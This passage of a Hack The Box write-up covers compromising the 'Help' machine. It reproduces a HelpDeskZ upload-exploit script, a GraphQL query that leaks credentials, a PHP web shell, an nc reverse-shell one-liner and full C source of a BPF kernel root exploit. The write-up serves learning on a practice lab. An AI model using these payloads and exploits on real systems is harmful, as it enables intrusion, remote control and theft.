				$filename_encoded = md5($filename.time()).&quot;.&quot;.$ext;
				$data = array('name' =&amp;gt; $filename, 'enc' =&amp;gt; $filename_encoded, 'filesize' =&amp;gt; $filesize, 'ticket_id' =&amp;gt; $ticketid, 'msg_id' =&amp;gt; $message_id, 'filetype' =&amp;gt; $attachment-&amp;gt;content_type);
				$db-&amp;gt;insert(TABLE_PREFIX.&quot;attachments&quot;, $data);
				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
			  }else{
				unlink(UPLOAD_DIR.$filename);
			  }
		  }
		}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-takes-the-file-and-uploads-it-then-theres-an-if-statement-that-checks-the-result-of-passing-fileinfo-to-a-function-called-verifyattachment-if-the-function-returned-0-it-will-rename-the-file-if-its-not-0-it-will-delete-the-file-unlinkupload_dirfilename--this-function-can-be-found-in-functionsphp-in-includes&quot;&gt;It takes the file and uploads it then there’s an &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement that checks the result of passing &lt;code class=&quot;highlighter-rouge&quot;&gt;$fileinfo&lt;/code&gt; to a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment&lt;/code&gt;. If the function returned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will rename the file. If it’s not &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will delete the file (&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink(UPLOAD_DIR.$filename)&lt;/code&gt;) . This function can be found in &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;functions.php&lt;/code&gt;&lt;/a&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment()&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/help/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function verifyAttachment($filename){
	global $db;	
	$namepart = explode('.', $filename['name']);
	$totalparts = count($namepart)-1;
	$file_extension = $namepart[$totalparts];
	if(!ctype_alnum($file_extension)){
		$msg_code = 1;
	}else{
		$filetype = $db-&amp;gt;fetchRow(&quot;SELECT count(id) AS total, size FROM &quot;.TABLE_PREFIX.&quot;file_types WHERE type='&quot;.$db-&amp;gt;real_escape_string($file_extension).&quot;'&quot;);
		if($filetype['total'] == 0){
			$msg_code = 2;
		}elseif($filename['size'] &amp;gt; $filetype['size'] &amp;amp;&amp;amp; $filetype['size'] &amp;gt; 0){
			$msg_code = 3;
			$misc = formatBytes($filetype['size']);
		}else{	
			$msg_code = 0;
		}
	}
	$data = array('msg_code' =&amp;gt; $msg_code, 'msg_extra' =&amp;gt; $misc);
	return $data;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-function-runs-several-checks-on-the-file-but-interestingly-it-doesnt-check-for-allowed-file-extensions-this-means-that-if-the-file-passed-these-checks-the-function-will-return-0-and-the-file-will-be-renamed-and-successfully-uploaded-no-matter-whats-the-extension-of-that-file-and-the-message-that-says--file-is-not-allowed-is-meaningless&quot;&gt;This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt; is meaningless.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-how-the-application-renames-files-it-gets-the-md5-hash-of-the-filename-concatenated-with-the-time-of-upload-then-it-concatenates-that-hash-with-the-original-file-extension-and-thats-how-the-exploit-finds-the-uploaded-file-but-theres-a-small-problem-about-time-running-the-exploit-on-our-box-would-use-our-local-time-if-the-timezone-of-the-web-app-is-different-from-the-timezone-of-our-box-the-exploit-will-fail-to-find-the-file-because-it-will-use-a-wrong-time&quot;&gt;If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-the-exploit-&quot;&gt;If we take a look at the exploit :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &amp;lt; 3:
    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print &quot;found!&quot;
        print url
        sys.exit(0)

print &quot;Sorry, I did not find anything&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-solve-this-problem-by-iterating-over-a-higher-range-than-300--for-x-in-range0-300&quot;&gt;We can solve this problem by iterating over a higher range than 300 : &lt;code class=&quot;highlighter-rouge&quot;&gt;for x in range(0, 300)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;this-will-make-it-try-different-hashes-according-to-different-times-until-it-finds-the-file-you-can-call-it-a-bruteforce-attack-that-will-be-easy-lets-look-at-another-solution-another-solution-is-to-get-credentials-to-login-to-the-web-app-and-edit-the-timezone-in-the-settings-to-make-it-the-same-as-ours&quot;&gt;This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nodejs-getting-credentials&quot;&gt;Node.js, Getting Credentials&lt;/h3&gt;
&lt;h4 id=&quot;we-saw-earlier-that-port-3000-was-open-and-running-nodejs-express-framework-and-we-havent-looked-at-that-yet&quot;&gt;We saw earlier that port 3000 was open and running &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express framework&lt;/code&gt; and we haven’t looked at that yet.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-going-to-httphelphtb3000-i-got-this-response-of-a-message-saying--hi-shiv-to-get-access-please-find-the-credentials-with-given-query-i-tried-test-and-got-this-&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/&lt;/code&gt; I got this response of a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hi Shiv, To get access please find the credentials with given query&quot;&lt;/code&gt;, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt; and got this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;tbh-the-next-step-involved-a-lot-of-guessingfuzzing-with-custom-wordlists-and-random-things-based-on-google-searches-about-nodejs-nodejs-queries-and-other-related-stuff-after-a-lot-of-attempts-to-find-something-when-i-tried-graphql-i-got-this-response-&quot;&gt;tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; queries and other related stuff. After a lot of attempts to find something when I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/graphql&lt;/code&gt; I got this response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-added-query--httphelphtb3000graphqlquery-and-got-a-syntax-error-&quot;&gt;So I added &lt;code class=&quot;highlighter-rouge&quot;&gt;?query&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query&lt;/code&gt; and got a syntax error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-fine-i-tried-requesting-a-query-for-example-user--httphelphtb3000graphqlqueryuser-&quot;&gt;That’s fine, I tried requesting a query, for example &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user}&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-says-that-user-must-have-a-selection-of-subfields-so-i-tried-username--httphelphtb3000graphqlqueryuserusername-&quot;&gt;It says that &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; must have a selection of subfields so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{username}}&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-lets-get-the-password--httphelphtb3000graphqlqueryuserpassword-&quot;&gt;Great, let’s get the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{password}}&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-used-crackstation-to-crack-the-hash-and-got-this-password-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash and got this password :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5d3c93182bb20f07b994a7f617e99cff&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;godhelpmeplz&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-the-credentials--helpmehelpmecom--godhelpmeplz&quot;&gt;Now we have the credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;helpme@helpme.com : godhelpmeplz&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-upload-exploitation-reverse-shell-and-user-flag&quot;&gt;File Upload Exploitation, Reverse Shell and User Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-edited-the-path-of-the-uploads-in-the-exploit-instead-of-helpdeskzbaseurlmd5hashphp-i-made-it-helpdeskzbaseurluploadsticketsmd5hashphp-i-got-this-path-from-the-github-repository-exploit-after-edits-&quot;&gt;I edited the path of the uploads in the exploit, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+md5hash+'.php'&lt;/code&gt; I made it &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'&lt;/code&gt; (I got this path from the &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github repository&lt;/a&gt;). Exploit after edits :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) &amp;lt; 3:
    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print &quot;found!&quot;
        print url
        sys.exit(0)

print &quot;Sorry, I did not find anything&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-the-settings-and-changed-the-timezone-to-the-same-timezone-as-mine-&quot;&gt;I went to the settings and changed the timezone to the same timezone as mine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-php-file-im-going-to-upload-is-simple-backdoorphp-which-can-be-found-in-usrsharewebshellsphpsimple-backdoorphp-in-kali-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file I’m going to upload is &lt;code class=&quot;highlighter-rouge&quot;&gt;simple-backdoor.php&lt;/code&gt; which can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;kali&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;

&amp;lt;?php

if(isset($_REQUEST['cmd'])){
        echo &quot;&amp;lt;pre&amp;gt;&quot;;
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
        die;
}

?&amp;gt;

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-submitted-the-ticket-&quot;&gt;I submitted the ticket :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-the-exploit-and-it-found-the-file-immediately-&quot;&gt;Then I ran the exploit and it found the file immediately :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python exploit.py http://10.10.10.121/support/ rick.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-lets-get-a-reverse-shell-i-used-this-payload--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf-url-encoded&quot;&gt;It’s working, let’s get a reverse shell, I used this payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&lt;/code&gt; (url encoded)&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kernel-exploit-privilege-escalation-and-root-flag&quot;&gt;Kernel Exploit, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;privilege-escalation-on-this-machine-was-very-easy-just-a-kernel-exploit-one-of-the-first-things-to-check-after-getting-a-shell-is-the-system-info-&quot;&gt;Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-kernel-version-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-an-exploit-published-for-it&quot;&gt;That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an &lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;exploit&lt;/a&gt; published for it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;linux/bpf.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;sys/un.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;
		&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;
		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
		&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;
		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;
		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;
		&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;
		&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;
		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;amp;attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;amp;attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&amp;amp;key,
		.value = (__u64)&amp;amp;value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;amp;attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;amp;attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, &quot;error: %s\n&quot;, err);
	exit(-1);
}

static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd &amp;lt; 0)
		__exit(strerror(errno));

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);

	if (progfd &amp;lt; 0)
		__exit(strerror(errno));

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));

	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;amp;progfd, sizeof(progfd)) &amp;lt; 0)
		__exit(strerror(errno));
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n &amp;lt; 0) {
		perror(&quot;write&quot;);
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, &quot;short write: %lu\n&quot;, n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&amp;amp;key, &amp;amp;value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr &amp;amp; ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus fp&quot;);
	
	sp = get_sp(fp);
	if (sp &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus sp&quot;);
	
	task_struct = __read(sp);

	if (task_struct &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus task ptr&quot;);

	printf(&quot;task_struct = %lx\n&quot;, task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus cred ptr&quot;);

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr &amp;lt; PHYS_OFFSET)
		__exit(&quot;bogus uid ptr&quot;);

	printf(&quot;uidptr = %lx\n&quot;, uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf(&quot;spawning root shell\n&quot;);
		system(&quot;/bin/bash&quot;);
		exit(0);
	}

	__exit(&quot;not vulnerable?&quot;);
}

int main(int argc, char **argv) {
	prep();
	pwn();

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-exploit-then-i-downloaded-it-on-the-box-&quot;&gt;I ran a python server to host the exploit then I downloaded it on the box :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-compiled-the-exploit-and-ran-it-&quot;&gt;Then I compiled the exploit and ran it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o exploit exploit.c&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - FluJab&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Python" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called HelpDeskZ. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is 10.10.10.121 I added it to /etc/hosts as help.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC help.htb We got ssh on port 22 and http on two ports : 80 and 3000. What’s running on port 80 is an Apache2 server and on port 3000 is Node.js Express Framework. HTTP Initial Enumeration On port 80 there’s just the default Apache index page : So I ran gobuster and got these results : gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] 